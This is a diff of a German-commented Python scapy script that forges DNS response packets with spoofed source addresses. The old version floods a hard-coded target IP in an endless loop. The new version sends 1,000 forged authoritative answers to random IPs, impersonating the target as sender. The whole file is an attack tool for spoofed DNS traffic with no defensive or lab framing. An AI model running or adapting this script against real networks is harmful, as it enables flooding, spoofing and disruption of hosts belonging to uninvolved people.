@@ -1,28 +1,33 @@
-from scapy.all import *
 import random
+from scapy.all import *
 
-# Ziel-IP-Adresse und DNS-Server
-target_ip = "155.1.102.4"  # Zieladresse
-dns_server = "155.1.102.4"     # DNS-Server
+# Ziel-IP-Adresse
+target_ip = "155.1.102.4"
+# DNS-Server-Adresse (kann eine zufällige IP sein)
+dns_server_ip = "8.8.8.8"
+# Anzahl der Pakete
+num_packets = 1000
 
-# Generiere zufällige Anfragen
-def generate_dns_response():
-    # Zufälliger Query-Name
-    query_name = f"test{random.randint(1, 10000)}.com"
-    
-    # Erstelle DNS Anfrage
-    dns_query = DNSQR(qname=query_name)
-    
-    # Erstelle DNS Antwort
-    dns_response = DNSRR(rrname=query_name, ttl=86400, rdata=target_ip)
-    
-    # Erstelle DNS Paket
-    dns_pkt = (IP(dst=target_ip, src=dns_server) /
-               UDP(dport=53, sport=random.randint(1024, 65535)) /
-               DNS(id=random.randint(0, 65535), qr=1, aa=1, qd=dns_query, an=dns_response))
-    
-    return dns_pkt
+# Generiere eine zufällige IP-Adresse
+def random_ip():
+    return ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
 
-# Sende die Pakete kontinuierlich
-while True:
-    send(generate_dns_response())
+# Generiere eine zufällige DNS-Antwort
+def random_dns_answer():
+    return ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
+
+# Erstelle und sende die Pakete
+for _ in range(num_packets):
+    # Zufällige Quell-IP
+    src_ip = random_ip()
+    # Zufällige DNS-Antwort-IP
+    answer_ip = random_dns_answer()
+
+    # Erstelle das DNS-Antwortpaket
+    dns_response = IP(src=target_ip, dst=src_ip) / UDP(sport=53, dport=random.randint(1024, 65535)) / \
+                   DNS(id=random.randint(0, 65535), qr=1, aa=1, qd=DNSQR(qname="example.com"), an=DNSRR(rrname="example.com", ttl=86400, rdata=answer_ip))
+
+    # Sende das Paket
+    send(dns_response, verbose=0)
+
+print(f"{num_packets} DNS-Antwortpakete wurden gesendet.")
